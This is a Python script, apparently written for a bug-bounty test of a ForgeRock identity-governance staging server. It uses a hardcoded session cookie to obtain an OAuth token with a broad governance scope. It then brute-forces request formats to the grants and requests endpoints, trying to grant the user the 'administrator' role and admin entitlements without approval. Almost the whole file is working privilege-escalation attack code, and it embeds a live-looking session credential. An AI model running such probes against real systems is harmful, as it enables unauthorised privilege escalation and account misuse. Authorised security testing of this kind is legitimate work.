# -*- coding: utf-8 -*-
"""AIC 第十五轮:grants 结构分析 + POST grants 授权请求格式爆破
预期结果表:
  成立 -> 请求需要审批流/参数校验拒绝未知格式
  不成立(发现) -> 可自助请求高权限角色/应用(自动授予或绕过审批)
"""
import requests, urllib3, json, base64, hashlib, os
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
COOKIE = 'amlbcookie=01; aa942d46ece12ce=tvVfNxaXuVbrr2BzbooZZTz8iTk.*AAJTSQACMDIAAlNLABxZNXdTYkVsVmxPdWdiRlZkeDc3V3doNTJ1VTg9AAR0eXBlAANDVFMAAlMxAAIwMQ..*'
RU = 'https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                  'Cookie': COOKIE})

def get_token():
    ver = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode()
    ch = base64.urlsafe_b64encode(hashlib.sha256(ver.encode()).digest()).rstrip(b'=').decode()
    url = (BASE + '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient'
           '&response_type=code&redirect_uri=%s&scope=%s&state=t'
           '&code_challenge=%s&code_challenge_method=S256' % (RU, 'openid fr:iga:*', ch))
    r = S.get(url, timeout=12, verify=False, allow_redirects=False)
    code = r.headers.get('Location', '').split('code=')[1].split('&')[0]
    r2 = S.post(BASE + '/am/oauth2/realms/alpha/access_token',
                data={'grant_type': 'authorization_code', 'code': code, 'redirect_uri': RU,
                      'client_id': 'endUserUIClient', 'code_verifier': ver}, timeout=12, verify=False)
    return r2.json()['access_token']

tok = get_token()
S2 = requests.Session()
S2.trust_env = False
S2.proxies = {'http': None, 'https': None}
S2.headers.update({'User-Agent': 'research-1643', 'Authorization': 'Bearer ' + tok,
                   'Cookie': COOKIE, 'Content-Type': 'application/json'})

def probe(method, path, body=None, raw=None):
    kw = {}
    if body is not None:
        kw['json'] = body
    if raw is not None:
        kw['data'] = raw
        kw['headers'] = {'Content-Type': 'application/json'}
    try:
        r = S2.request(method, BASE + path, timeout=12, verify=False, **kw)
        print('%-5s %-70s -> %d  %s' % (method, path[:70], r.status_code, r.text[:300].replace('\n', ' ')))
        return r
    except Exception as e:
        print('%-5s %-70s -> ERR %s' % (method, path[:70], str(e)[:60]))

print('=== 1. 完整 grants 结构 ===')
r = probe('GET', '/iga/governance/user/%s/grants?pageSize=20' % MY_ID)
if r and r.status_code == 200:
    j = r.json()
    with open(r'D:\scan\_aic_grants.json', 'w', encoding='utf-8') as f:
        f.write(json.dumps(j, indent=2, ensure_ascii=False))
    print('saved full grants json, count:', j.get('totalCount'))

print('\n=== 2. POST grants 格式爆破 ===')
GP = '/iga/governance/user/%s/grants' % MY_ID
bodies = [
    {'type': 'role', 'name': 'administrator'},
    {'type': 'roles', 'name': 'administrator'},
    {'type': 'role', 'id': 'administrator'},
    {'item': {'type': 'role', 'name': 'administrator'}},
    {'type': 'applications', 'name': 'testapp'},
    {'type': 'application', 'name': 'testapp'},
    {'type': 'entitlements', 'name': 'admin'},
    {'type': 'accountGrant', 'name': 'admin'},
    {'type': 'entitlementGrant', 'name': 'admin'},
    {'type': 'role', 'name': 'administrator', 'reason': 'test', 'justification': 'test'},
    {'targetType': 'role', 'targetName': 'administrator'},
]
for b in bodies:
    probe('POST', GP, b)

print('\n=== 3. requests POST 带 _action ===')
RP = '/iga/governance/user/%s/requests' % MY_ID
probe('POST', RP + '?_action=create', {'requests': [{'targetType': 'role', 'targetName': 'administrator'}]})
probe('POST', RP + '?_action=search', {'targetFilter': {}})
probe('POST', RP + '?_action=create', {'role': 'administrator'})
